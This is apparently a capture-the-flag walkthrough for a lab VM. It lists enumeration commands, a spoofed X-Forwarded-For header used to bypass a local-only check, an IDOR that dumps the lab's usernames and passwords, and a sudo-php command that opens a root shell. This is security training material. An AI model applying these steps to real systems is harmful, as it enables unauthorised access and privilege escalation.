# Table of Contents

- [Enumeration](#enumeration)
- [Penetration](#penetration)
- [Escelation](#escelation)


---

## Enumeration: 
- VM IP: sudo netdiscover
	* VMWare 192.168.1.13
- VM info: nmap -A 192.168.1.13
- web server info: dirb -w http://192.168.1.13
	* http://192.168.1.13/index.php
	* http://192.168.1.13/misc/process.php
	* http://192.168.1.13/config/config.php
	* http://192.168.1.13/heyhoo.txt

## Penetration:
- index.php req local access
- header capture/info with fiddler
- custom header with browser extension(X-Forwarded-For: 0.0.0.0)
- local access granted 
- register: http://192.168.1.13/index.php?page=register
- login: http://192.168.1.13/index.php?page=login
- profile : http://192.168.1.13/index.php?page=profile&user_id=13
- form actio="#" -> POSTS data on index.php?page=profile
- user_id allows to get all the name,uname,pass values 
- uname:pass list
	1.eweuhtandingan:skuyatuh
	2.aingmaung:qwerty!!!
	3.sundatea:indONEsia
	4.sedihaingmah:cedihhihihi
   -->  5.alice:4lic3
	6.abdikasepak:dorrrrr
- ssh 192.168.1.13 -l alice 
- login in and capture flag1 
			
## Privilege Escelation:
- sudo -l:
	* alice has root access on /usr/bin/php
- sudo php -r 'shell_exec("sudo /bin/bash -i 1>&0");'
- root access granted
- cd /root && cat flag* and capture flag2





